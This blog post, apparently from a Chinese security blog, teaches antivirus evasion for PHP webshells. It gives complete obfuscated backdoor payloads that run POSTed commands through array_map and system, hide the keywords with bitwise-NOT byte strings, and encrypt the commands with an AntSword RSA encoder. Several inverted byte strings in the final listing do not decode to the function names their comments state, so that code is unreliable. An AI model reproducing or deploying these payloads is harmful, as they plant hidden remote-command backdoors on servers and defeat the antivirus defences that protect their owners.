---
title: PHP WebShell 免杀之字符串运算 + 动态调用
date: 2026-04-29 07:00:00
categories: 
  - 远控免杀
tags:
  - PHP WebShell 免杀
---

# PHP WebShell 免杀之字符串运算 + 动态调用

## 前言

以火绒为例，如果直接传入一句话木马包被识别的

例如下面我刚写完保存就给我删了

![](https://pic1.imgdb.cn/item/69f13e1686dda55bd7338b8e.png)

我们要从杀软的角度去思考，毕竟杀软也是圈内安全人士开发的

识别木马最简单的方法就是读取文件内容识别关键字如 `eval`、`assert` 等等

当然也还有结构特征，例如 `@eval($_GET["code"])` 等等

以上是静态的，当然还有动态的，只不过这个根据杀软的强度来的，只要静态过了，动态大概率会过

WebShell 的动态不像 C2 木马那样容易捕捉

## 思路

先确定 Payload 结构，避免常规的结构特征，使用较为冷门的去打 RCE

`array_map` 的作用是将回调函数（这里是 system）应用到数组的每一个元素上

数组里只有一个元素 `$_POST['cmd']`，于是 `system` 会执行这个命令，并在页面上输出结果

```php
array_map('system', [$_POST['cmd']]);
```

利用 PHP 的字符串特性，如异或（`^`）、取反（`~`）、自增（`++`）来动态构造关键词

我们可以将关键字拆开，先构造出关键字的部分字符，然后再拼接起来

PHP 的按位取反运算符 `~` 作用在字符串上，会对其每个字节执行**按位取反**

如果原始字符串为 `array_map`，我们可以先计算出它每个字符取反后的字节序列，然后将这个不可打印的十六进制字符串嵌入代码，再用 `~` 取反回来，得到原始字符串

例如：

```
"a" (97) 取反 → 0x9E
"r" (114) 取反 → 0x8D
```

`array_map` 的完整序列就是 `\x9E\x8D\x8D\x9E\x86\xA0\x92\x9E\x8F`

再进一步打散特征，不直接写成一大串，而是拆成多段用 `.` 连接

```php
"\x9E\x8D\x8D" . "\x9E\x86\xA0" . "\x92\x9E\x8F"
```

为了避免敏感词汇，所有变量名使用 `_` 命名，得到

```php
$_ = ~(
    "\x9E\x8D\x8D" .
    "\x9E\x86\xA0" .
    "\x92\x9E\x8F"
);
$__ = ~(
    "\x8C\x86\x8C" .
    "\x8B\x9A\x92"
);
$___ = ~(
    "\xA0" .
    "\xAF\xB0" .
    "\xAC\xAB"
);
$____ = ~(
    "\x9C" .
    "\x92\x9B"
);
```

最后是动态调用

```
$___ = "_POST"
${$___} 是 PHP 可变变量语法，等价于 $_POST
$____ = "cmd"
${$___}[$____] 即 $_POST['cmd']
```


完整 Payload 如下：

```php
<?php
$_ = ~(
    "\x9E\x8D\x8D" .
    "\x9E\x86\xA0" .
    "\x92\x9E\x8F"
);
$__ = ~(
    "\x8C\x86\x8C" .
    "\x8B\x9A\x92"
);
$___ = ~(
    "\xA0" .
    "\xAF\xB0" .
    "\xAC\xAB"
);
$____ = ~(
    "\x9C" .
    "\x92\x9B"
);

$_($__, [${$___}[$____]]);
?>
```

## 实战

![](https://pic1.imgdb.cn/item/69f13c3386dda55bd7338b8d.png)

![](https://pic1.imgdb.cn/item/69f1430386dda55bd7338bbd.png)

使用蚁剑 RSA 加密效果如下：

![](https://pic1.imgdb.cn/item/6a0f4e362cb0eba86fb481bf.png)

这是编码器源码：

```js
'use strict';

module.exports = (pwd, data, ext = {}) => {
    const rawPayload = data['_'];
    const n = Math.ceil(rawPayload.length / 80);
    const blockLen = Math.ceil(rawPayload.length / n);
    const blocks = [];

    for (let i = 0; i < n; i++) {
        const block = rawPayload.substr(i * blockLen, blockLen);
        // 使用私钥加密，输出 Base64
        blocks.push(ext['rsa'].encryptPrivate(block, 'base64'));
    }

    data[pwd] = blocks.join('|');
    delete data['_'];
    return data;
}
```

这是最后含有加密的代码

```php
// ===== 原有混淆：array_map, system, _POST, cmd =====
$_ = ~("\x9E\x8D\x8D"."\x9E\x86\xA0"."\x92\x9E\x8F");            // array_map
$__ = ~("\x8C\x86\x8C"."\x8B\x9A\x92");                          // system
$___ = ~("\xA0"."\xAF\xB0"."\xAC\xAB");                          // _POST
$____ = ~("\x9C"."\x92\x9B");                                    // cmd

// ===== 新增：RSA 解密相关函数名字符串取反 =====
$_pkf   = ~("\x90\x91\x8D\x9A\x93\x8C\x8C\x9C\x97\x9E\x8A\x9F\x9A\x8C\x9E\x8D\x9F\x96\x9B\x8F\x9E\x8C"); // openssl_pkey_get_public
$_decf  = ~("\x90\x91\x8D\x9A\x93\x8C\x8C\x9C\x91\x96\x9B\x8F\x9E\x8C\x9B\x8D\x9A\x8B\x9C\x8A\x8D");   // openssl_public_decrypt
$_b64   = ~("\x8C\x9E\x8C\x8D\x9E\x9B\x9C\x8B\x9A\x9B\x90\x9A\x8D");                                  // base64_decode
$_exp   = ~("\x9A\x87\x91\x8F\x90\x8B\x9A");                                                          // explode
$_sep   = ~("\x83");                                                                                   // |

// ===== 公钥明文（无需取反） =====
$pubkey = "-----BEGIN PUBLIC KEY-----
MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCLpefN/JHlJ9emUYAQ4cslKjYz
qiWvtnwMcNtI4a0QIXirSYGPkcKarufzc66MMaEUS2pcW6OeufL6/008txLw+tvD
gwLQoK+x1CL3TgXMfanULfWuKz9ZYq85RG1NpK/Nh/874HlqEfU41px5Oww5SZ/o
YaZSJ2b+6gXYP0mYNQIDAQAB
-----END PUBLIC KEY-----";

// ===== 获取加密载荷 =====
$enc_cmd = @${$___}[$____];                     // $_POST['cmd']
if (!empty($enc_cmd)) {
    // 分割密文块
    $blocks = $_exp($_sep, $enc_cmd);           // explode('|', ...)
    // 加载公钥
    $pk = $_pkf($pubkey);                       // openssl_pkey_get_public(...)
    $cmd = '';
    // 逐块解密拼接
    foreach ($blocks as $block) {
        $decoded = $_b64($block);               // base64_decode
        $de = '';
        if ($_decf($decoded, $de, $pk)) {       // openssl_public_decrypt
            $cmd .= $de;
        }
    }
    // 仍使用原马方式执行系统命令
    $_($__, [$cmd]);                            // array_map("system", [$cmd])
}
```

![](https://pic1.imgdb.cn/item/6a0f4ee32cb0eba86fb481c1.png)